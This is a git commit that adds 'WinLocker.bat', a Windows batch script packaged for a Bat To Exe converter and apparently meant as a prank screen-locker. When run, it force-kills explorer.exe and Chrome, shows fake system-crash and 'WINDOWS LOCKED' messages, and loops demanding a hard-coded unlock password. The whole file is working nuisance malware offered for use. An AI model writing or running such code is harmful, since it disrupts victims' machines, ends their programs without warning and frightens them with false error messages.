578ea03827a1e8b2cd4bd125893a4ede77662322
LogInMask <91027924+LogInMask@users.noreply.github.com>
2021-12-28 23:26:58 +0200

    Add files via upload

---
+++ WinLocker.bat
@@ -0,0 +1,64 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFB9VQh2DAE+/Fb4I5/jH2OOJjkIeX+ctNorD39Q=
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+color 2
+title WinLocker
+taskkill /im explorer.exe /f > nul
+taskkill /im chrome.exe /f > nul
+:G
+echo error 0423563634x676888000000))))))error system32:003878854)))(
+echo Technical Information:
+
+echo **STOP: 0x1000000034e (0xffffffffffffc0000005, 0xffff800002e65713)
+
+echo ***WINDOWS LOCKED***
+echo ***EXPLORER.exe LOCKED***
+echo ***YOU START VIRUS.bat***
+echo ***SYSTEM32 BLOCKED***
+
+echo Enter the unlock password:
+set /p x=
+if %x%==fixmeplz (cls&&echo Windows unlocked!&&goto unlock
+:unlock
+pause
+start explorer
+exit
+) ELSE (
+cls
+echo Unlock password is incorrect!
+echo Enter unlock password again!
+
+)
+
+goto G
